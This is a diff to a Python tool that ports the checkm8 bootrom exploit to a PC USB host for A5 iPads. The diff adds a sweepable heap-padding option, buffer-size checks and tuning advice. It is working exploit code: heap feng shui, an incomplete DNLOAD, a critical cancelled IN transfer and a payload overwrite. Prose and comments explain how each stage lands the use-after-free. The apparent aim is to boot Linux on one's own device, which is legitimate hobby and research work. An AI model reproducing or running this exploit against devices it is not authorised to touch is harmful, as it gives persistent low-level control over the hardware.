@@ -20,6 +20,7 @@ Usage:
     python3 tools/checkm8-a5-pwn.py                 # pwn the DFU device
     python3 tools/checkm8-a5-pwn.py --wait --debug  # wait for DFU, then pwn
     python3 tools/checkm8-a5-pwn.py --feng-shui-mode setup-only --leak 626
+    python3 tools/checkm8-a5-pwn.py --wait --debug --padding 0x600  # swept padding
 
 Host adaptation: a PC USB stack sends DATA1 after SETUP, so the Arduino's
 0xcc "pre-packets" are toggle dummies and are intentionally not sent here.
@@ -39,14 +40,18 @@ phase).  Consequences for this host port:
     (a completed transfer frees the response buffer = no leak, and its
     status ZLP would reset state).  --feng-shui-mode in-cancel (default)
     matches the Arduino; setup-only cancels before the data phase.
-  - stage 2 incomplete DNLOAD: submit the full 0x700 and cancel at a fixed
-    ~1 ms deadline (--out-spin-us), then read back how many bytes actually
-    reached the device and send a remainder transfer — an invalid SETUP
-    whose error path leaves the globals alone, with wLength = 0x6C0 -
-    received and zero-filled data — that lands the device at exactly
-    rcvd=0x6C0 of length=0x700 with no timing race.  Sending all 0x700 fires
-    end_of_transfer and resets the globals (the exploit would die silently
-    in stage 3), so the tool aborts with a clear message instead.
+  - stage 2 incomplete DNLOAD: submit the full length (padding + 0x40) and
+    cancel at a fixed ~1 ms deadline (--out-spin-us), then read back how
+    many bytes actually reached the device and send a remainder transfer —
+    an invalid SETUP whose error path leaves the globals alone, with
+    wLength = padding - received and zero-filled data — that lands the
+    device at exactly rcvd=padding of length=padding+0x40 with no timing
+    race.  Sending the full length fires end_of_transfer and resets the
+    globals (the exploit would die silently in stage 3), so the tool aborts
+    with a clear message instead.  padding (--padding, default 0x6C0) is the
+    offset of the pending io_request inside the freed io_buffer where the
+    overwrite must land; the PC heap layout can shift it from the Arduino
+    value, so it is sweepable in 0x40 steps over 0x40..0x780.
   - stage 3 critical IN: cancelled at the SETUP stage (--spin-us deadline),
     before any data or status phase.
   - the overwrite/payload OUT writes complete the data stage on purpose
@@ -56,7 +61,10 @@ phase).  Consequences for this host port:
 Exit status: 0 = device reports 'PWND:[checkm8]' (already pwned counts),
 1 = fail.  If the exploit misses, re-enter DFU on the iPad (Power+Home) and
 try again; tune --leak / --leak-delay-ms / --feng-shui-mode / --spin-us /
---out-spin-us from the --debug output.
+--out-spin-us / --padding from the --debug output.  If the device dies in
+stage 3 (overwrite OUT times out), sweep --padding in 0x40 steps over
+0x40..0x780 (default 0x6C0), one fresh DFU entry per attempt; if no padding
+works, sweep --leak around 620 (±16/±32) and re-sweep --padding.
 """
 
 import argparse
@@ -83,6 +91,11 @@ A5_PADDING = 0x6C0
 A5_LEAK_COUNT = 620
 A5_PAYLOAD_LEN = 0x2C0
 A5_OVERWRITE_LEN = 0x40
+# The DFU's input/output buffer is 0x800 bytes (see the heap layout in the
+# checkm8 write-ups: the io_buffer chunk is 0x840 = 0x40 heap header + 0x800
+# data).  The DNLOAD interface handler rejects wLength >= io_buffer size, so
+# the incomplete DNLOAD's wLength (padding + 0x40) must stay below it.
+IO_BUFFER_SIZE = 0x800
 
 PAYLOAD_FILES = {
     'classic': ('checkm8_s5l8940x.bin', 704,
@@ -569,7 +582,7 @@ def stage1(usb, serial_idx, leak_count, mode, spin_us, leak_delay_ms, debug):
     reset_and_release(usb, handle, settle=1.0)
 
 
-def stage2(usb, out_spin_us, debug):
+def stage2(usb, out_spin_us, padding, debug):
     print('== stage 2: set global state / re-enter DFU ==')
     dev, handle, desc, _ = acquire(usb, want_serial=False)
     # (d) SETUP(DNLOAD, wLength=0x40) + OUT(0x80) + INHS status.  wLength and
@@ -594,16 +607,20 @@ def stage2(usb, out_spin_us, debug):
         if debug:
             print('    [debug] GETSTATUS %d        ctrl_in rc=%d raw=%s' % (i + 1, rc, raw.hex()))
     # (g) incomplete DNLOAD.  The device must end up with
-    # ep0_data_phase_rcvd = 0x6C0 of length = 0x700: if it receives all 0x700
-    # it fires end_of_transfer and resets the globals, and stage 3 silently
-    # writes into a dead pointer.  A PC host cannot cancel mid-data-stage by
-    # length (the xHCI controller reports actual_length only when the data
-    # stage ends), so: (1) submit the full 0x700 and cancel at a fixed ~1 ms
-    # deadline (--out-spin-us) — the cancel result reports exactly how many
-    # bytes the device received; (2) send a remainder transfer that appends
-    # the missing bytes, which lands the device at exactly 0x6C0 of 0x700
-    # with no timing race.
-    w_length = A5_PADDING + 0x40
+    # ep0_data_phase_rcvd = padding of length = padding + 0x40: if it
+    # receives all of length it fires end_of_transfer and resets the
+    # globals, and stage 3 silently writes into a dead pointer.  A PC host
+    # cannot cancel mid-data-stage by length (the xHCI controller reports
+    # actual_length only when the data stage ends), so: (1) submit the full
+    # length and cancel at a fixed ~1 ms deadline (--out-spin-us) — the
+    # cancel result reports exactly how many bytes the device received;
+    # (2) send a remainder transfer that appends the missing bytes, which
+    # lands the device at exactly rcvd=padding of length=padding+0x40 with
+    # no timing race.  padding is the offset of the pending io_request
+    # inside the freed io_buffer where the overwrite must land; the PC heap
+    # layout can shift it from the Arduino value, so it is sweepable
+    # (--padding).
+    w_length = padding + 0x40
     data = b'\0' * w_length
     rc, info = usb.raw_ctrl(handle, 0x21, REQ_DNLOAD, 0, 0, w_length,
                             data, abandon=True, cancel_at=0,
@@ -625,7 +642,7 @@ def stage2(usb, out_spin_us, debug):
     # The device only counts fully ACKed 0x40 packets; a cancel can stop the
     # data stage mid-packet, so round down to the packet boundary.
     received = actual - (actual % 0x40)
-    remainder = A5_PADDING - received
+    remainder = padding - received
     print('  incomplete DNLOAD: %#x of %#x bytes on the wire (%d full packets), '
           '%#x remainder to send' % (actual, w_length, received // 0x40, remainder))
     if remainder > 0:
@@ -699,7 +716,11 @@ def verify(usb):
     except SystemExit:
         raise SystemExit('error: no DFU device after the final reset — the exploit\n'
                          'did not complete. Re-enter DFU on the iPad (Power+Home)\n'
-                         'and try again.')
+                         'and try again. If the device died in stage 3 (overwrite OUT\n'
+                         'timed out with --debug), the PC heap layout differs from the\n'
+                         'Arduino: sweep --padding in 0x40 steps over 0x40..%#x\n'
+                         '(default %#x), one fresh DFU entry per attempt.'
+                         % (IO_BUFFER_SIZE - 0x80, A5_PADDING))
     print('Found:', serial.strip())
     usb.release(handle)
     return serial
@@ -712,6 +733,13 @@ def exploit(args):
     print('*** checkm8 A5 host port (S5L8940X, CPID 0x8940, iBoot-838.3) ***')
     print('payload: %s (%d bytes, sha1 %s)' % (args.payload, len(payload), sha1(payload)))
     print('overwrite: %d bytes, sha1 %s' % (len(overwrite), sha1(overwrite)))
+    if args.padding % 0x40 or not 0x40 <= args.padding <= IO_BUFFER_SIZE - 0x80:
+        raise SystemExit('error: --padding must be 0x40-aligned and within '
+                         '[0x40, %#x] (the DNLOAD wLength padding+0x40 must '
+                         'stay below the %#x io_buffer)'
+                         % (IO_BUFFER_SIZE - 0x80, IO_BUFFER_SIZE))
+    print('padding: %#x (overwrite offset in io_buffer), leak: %d'
+          % (args.padding, args.leak))
     start = time.time()
 
     # Prefer the kernel-cached sysfs serial: reading it costs zero USB
@@ -765,17 +793,21 @@ def exploit(args):
         stage1(usb, serial_idx, args.leak, args.feng_shui_mode, args.spin_us,
                args.leak_delay_ms, args.debug)
     if args.stage in ('all', '2'):
-        stage2(usb, args.out_spin_us, args.debug)
+        stage2(usb, args.out_spin_us, args.padding, args.debug)
     if args.stage in ('all', '3'):
         stage3(usb, serial_idx, payload, overwrite, args.spin_us, args.debug)
     serial = verify(usb)
     if PWN_MARKER not in serial:
         raise SystemExit('error: exploit failed — device did not enter pwned DFU mode.\n'
                          'Re-enter DFU (Power+Home) and try again. With --debug, check\n'
-                         'that the incomplete DNLOAD is CANCELLED with actual < 0x700 and\n'
+                         'that the incomplete DNLOAD is CANCELLED with actual < %#x and\n'
                          'the remainder transfer follows, that the critical IN is\n'
                          'CANCELLED/STALL (not COMPLETED), and that stage 2 survived its\n'
-                         'reset (set-state OUT completes, GETSTATUS returns 6 bytes).')
+                         'reset (set-state OUT completes, GETSTATUS returns 6 bytes).\n'
+                         'If stage 2 survived but the device still missed, sweep --padding\n'
+                         'in 0x40 steps over 0x40..%#x (default %#x) — one fresh DFU entry\n'
+                         'per attempt.' % (args.padding + 0x40, IO_BUFFER_SIZE - 0x80,
+                                           A5_PADDING))
     print('Device is now in pwned DFU mode.')
     print('(%0.2f seconds)' % (time.time() - start))
     print('Next: ./boot/boot-linux.sh --skip-pwn')
@@ -790,8 +822,11 @@ def selftest(args):
     payload, _ = load_payloads(args.payload)
     if len(payload) != A5_PAYLOAD_LEN:
         raise SystemExit('error: selected payload is not the A5 0x2C0 payload')
-    print('A5 constants: padding=%#x leak=%d payload=%#x overwrite=%#x'
-          % (A5_PADDING, A5_LEAK_COUNT, A5_PAYLOAD_LEN, A5_OVERWRITE_LEN))
+    print('A5 constants: padding=%#x leak=%d payload=%#x overwrite=%#x io_buffer=%#x'
+          % (A5_PADDING, A5_LEAK_COUNT, A5_PAYLOAD_LEN, A5_OVERWRITE_LEN,
+             IO_BUFFER_SIZE))
+    print('--padding sweep range: 0x40..%#x in 0x40 steps (default %#x)'
+          % (IO_BUFFER_SIZE - 0x80, A5_PADDING))
     print('selftest OK')
     return 0
 
@@ -821,9 +856,15 @@ def main():
                              '(default: %(default)s)')
     parser.add_argument('--out-spin-us', type=int, default=1000,
                         help='stage 2 incomplete DNLOAD cancel deadline, '
-                             'microseconds — cancel the 0x700-byte data stage '
-                             'after ~this long so the final 0x40 packet never '
-                             'reaches the device (default: %(default)s = 1 ms)')
+                             'microseconds — cancel the data stage after ~this '
+                             'long so the final 0x40 packet never reaches the '
+                             'device (default: %(default)s = 1 ms)')
+    parser.add_argument('--padding', type=lambda s: int(s, 0), default=A5_PADDING,
+                        help='io_buffer offset where the overwrite must land — the '
+                             'position of the pending io_request inside the freed '
+                             'io_buffer; 0x40-aligned, 0x40..0x780. The PC heap '
+                             'layout can shift it from the Arduino value, so sweep '
+                             'it in 0x40 steps (default: 0x6C0)')
     parser.add_argument('--stage', choices=['all', '0', '1', '2', '3', 'verify'], default='all',
                         help='run only one stage (default: all)')
     parser.add_argument('--wait', action='store_true',
